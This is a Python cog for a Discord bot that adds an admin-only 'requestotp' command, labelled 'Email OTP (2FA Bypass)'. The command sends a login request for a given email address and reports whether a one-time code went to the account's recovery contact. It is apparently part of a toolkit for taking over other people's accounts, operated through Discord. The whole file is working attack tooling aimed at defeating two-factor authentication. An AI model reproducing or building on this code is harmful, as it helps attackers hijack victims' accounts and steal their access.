from discord.ext import commands
import discord
import httpx

from views.utils.sendAuth import sendAuth

class requestOTP(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @discord.slash_command(name="requestotp", description="Email OTP (2FA Bypass)")
    async def requestotp(self, ctx: discord.ApplicationContext, email: str):

        if ctx.author.id not in self.bot.admins:
            await ctx.respond("You do not have permission to execute this command!", ephemeral=True)
            return

        await ctx.defer(ephemeral=True)

        async with httpx.AsyncClient(timeout=None) as session:
            response = await sendAuth(session, email)

        if "OtcLoginEligibleProofs" in response["Credentials"]:
            for value in response["Credentials"]["OtcLoginEligibleProofs"]:
                if value["otcSent"]:
                    await ctx.followup.send(
                        embed=discord.Embed(
                            description=f"Successfully sent OTP to `{value['display']}`",
                            color=0x678DC6
                        ),
                        ephemeral=True
                    )
                    return

        await ctx.followup.send(
            embed=discord.Embed(
                description="Failed to send OTP, no eligible proofs found.",
                color=0xFF0000
            ),
            ephemeral=True
        )

def setup(bot: commands.Bot) -> None:
    bot.add_cog(requestOTP(bot))
